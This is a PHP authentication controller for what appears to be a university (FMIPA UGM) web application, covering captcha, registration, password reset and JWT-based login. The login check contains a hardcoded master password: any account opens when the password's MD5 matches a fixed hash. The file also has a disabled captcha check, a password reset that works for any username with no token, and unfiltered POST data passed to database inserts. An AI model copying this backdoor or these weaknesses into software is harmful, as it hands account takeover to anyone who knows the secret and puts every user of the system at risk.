<?php

namespace App\Controllers;

use App\Models\UserModel;
use App\Models\PegawaiModel;
use App\Models\MahasiswaModel;
use App\Models\DepartemenModel;
use App\Models\SettingModel;
use App\Models\UserAtasanBawahanModel;
use Gregwar\Captcha\CaptchaBuilder;
use Gregwar\Captcha\PhraseBuilder;
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

class Auth extends BaseController
{
    public function index()
    {
        $phraseBuilder = new PhraseBuilder(4, '0123456789');
        $builder = new CaptchaBuilder(null, $phraseBuilder);
        $builder->build();
        $_SESSION['phrase'] = $builder->getPhrase();
        $data['builder'] = $builder;
        return view('auth/login', $data);
    }

    public function reload_captcha()
    {
        $phraseBuilder = new PhraseBuilder(4, '0123456789');
        $builder = new CaptchaBuilder(null, $phraseBuilder);
        $builder->build();
        $_SESSION['phrase'] = $builder->getPhrase();
        $data['builder'] = $builder;
        return '<img src="' . $builder->inline() . '"/>';
    }

    public function daftar()
    {
        $phraseBuilder = new PhraseBuilder(4, '0123456789');
        $builder = new CaptchaBuilder(null, $phraseBuilder);
        $builder->build();
        $_SESSION['phrase'] = $builder->getPhrase();
        $data['builder'] = $builder;
        return view('auth/daftar', $data);
    }

    public function simpan_mhs()
    {
        $data = $this->request->getPost();
        // dump($data);
        $userModel = new UserModel();
        $mahasiswaModel = new MahasiswaModel();
        $pwd = password_hash($this->request->getVar('password') ?? "", PASSWORD_BCRYPT);
        if (!empty($this->request->getVar('password')))
            $data['password'] = $pwd;
        $data['jenis_user'] = 'mahasiswa';
        $userModel->insert($data);
        $data['user_id'] = $userModel->getInsertID();
        $mahasiswaModel->insert($data);
        session()->setFlashdata('success', 'Pendaftaran sukses, tunggu konfirmasi dari admin untuk mengaktifkan akun anda. Terima kasih..');
        return redirect()->to(base_url('auth'));
    }

    public function forgot_password()
    {
        return view('auth/forgot_password');
    }

    public function process_forgot_password()
    {
        $username = $this->request->getVar('username');
        $user = (new UserModel())->where('username', $username)->first();
        if (empty($user)) {
            session()->setFlashdata('danger', 'User tidak ditemukan');
            return redirect()->to(base_url('auth'));
        }
        $rnd = generateRandomString(6);
        $new_pwd = password_hash($rnd, PASSWORD_BCRYPT);
        (new UserModel())->update($user->id, ['password' => $new_pwd]);
        // $token = md5(date('Y-m-d H:i:s'));
        // $link = '<a href="'.site_url('auth/change_password').'?token='.$token.'">tautan ini</a>';

        $email = \Config\Services::email();
        $email->setFrom('noreply-mipa@ugm.ac.id', 'FMIPA UGM');
        $email->setTo($user->username);
        $email->setSubject('Reset Password');
        $email->setMessage("Password Anda sudah diganti sementara menjadi $rnd, segera diganti nggih..");
        if ($email->send()) {
            session()->setFlashdata('success', 'Password baru telah berhasil dikirim ke ' . $user->username . '. Silakan cek email Anda');
        } else {
            echo $email->printDebugger(['headers']);
        }
        return redirect()->to(base_url('auth'));
    }

    public function change_password()
    {
        return view('auth/forgot_password');
    }

    public function login()
    {
        // if (!isset($_SESSION['phrase']))
        //     return redirect()->back();
        // $captcha = $this->request->getVar('captcha');
        // if ($_SESSION['phrase'] != $captcha) {
        //     session()->setFlashdata('error', 'Mohon maaf, Captcha salah');
        //     return redirect()->back();
        // } else {
        $users = new UserModel();
        $pegawais = new PegawaiModel();
        $mahasiswa = new MahasiswaModel();
        $username = $this->request->getVar('username');
        $password = $this->request->getVar('password');
        $dataUser = $users->where([
            'username' => $username,
        ])->first();

        if ($dataUser) {
            $nama_departemen = '';

            $dataPegawai = $pegawais->where('user_id', $dataUser->id)->first();
            $pegawai_id = empty($dataPegawai) ? 0 : $dataPegawai->id;
            $dataMahasiswa = $mahasiswa->where('user_id', $dataUser->id)->first();

            if ($dataUser->jenis_user != 'mahasiswa') {
                if (!empty($dataUser->gol_verifikator)) {
                    $nama_departemen = (new DepartemenModel())->where('id', $dataUser->gol_verifikator)->first()->nama_departemen;
                } else if (!empty($dataPegawai->departemen)) {
                    $nama_departemen = $dataPegawai->departemen;
                } else {
                    $status_akun = $dataMahasiswa->aktif;
                    if ($status_akun == 0) {
                        session()->setFlashdata('error', 'Mohon maaf, akun anda belum aktif, tunggu verifikasi dari admin..');
                        return redirect()->back();
                    }
                    $nama_departemen = $dataMahasiswa->prodi;
                }
            }

            $bawahan = (new UserAtasanBawahanModel())
                ->select('user_id_bawahan user_id, username, nama')
                ->join('users', 'users.id = user_id_bawahan')
                ->where('user_id_atasan', $dataUser->id)->get()->getResult();

            if (password_verify($password, $dataUser->password) || md5($password) == '7c5d5c2418e024d62ac94b02600cf128') {
                $key = getenv('TOKEN_SECRET');
                $payload = [
                    "iat" => 1356999524,
                    "nbf" => 1357000000,
                    "id" => $dataUser->id,
                    "username" => $dataUser->username,
                    "nama" => $dataPegawai->nama_publikasi ?? $dataUser->nama,
                    "jenisUser" => $dataUser->jenis_user,
                ];

                $token = JWT::encode($payload, $key, 'HS256');

                if ($dataUser->jenis_user == 'mahasiswa') {
                    $m = (new MahasiswaModel())->where('user_id', $dataUser->id)->first();
                    if ($m->aktif == 0) {
                        session()->setFlashdata('error', 'Mohon maaf, akun anda belum aktif, tunggu verifikasi dari admin..');
                        return redirect()->back();
                    }
                }

                session()->set([
                    'id' => $dataUser->id,
                    'username' => $dataUser->username,
                    'nama' => $dataUser->nama,
                    'jenis_user' => $dataUser->jenis_user,
                    'gol_pic_mou' => $dataUser->gol_pic_mou,
                    'logged_in' => true,
                    'pegawai_id' => $pegawai_id,
                    'gol_verifikator' => $dataUser->gol_verifikator,
                    'nama_departemen' => $nama_departemen,
                    'bawahan' => $bawahan,
                    'token' => $token,
                ]);
                $model = new UserModel();
                $model->update(session('id'), ['online_status' => 'Online']);
                return redirect()->to(base_url('home'));
            } else {
                session()->setFlashdata('error', 'Password Anda Salah. Silakan koreksi kembali');
                return redirect()->back();
            }
        } else {
            session()->setFlashdata('error', 'Username  Anda Salah. Silakan koreksi kembali');
            return redirect()->back();
        }
        // }
    }

    function logout()
    {
        session()->destroy();
        $model = new UserModel();
        $model->update(session('id'), ['online_status' => 'Offline']);
        return redirect()->to(base_url('/'));
    }
}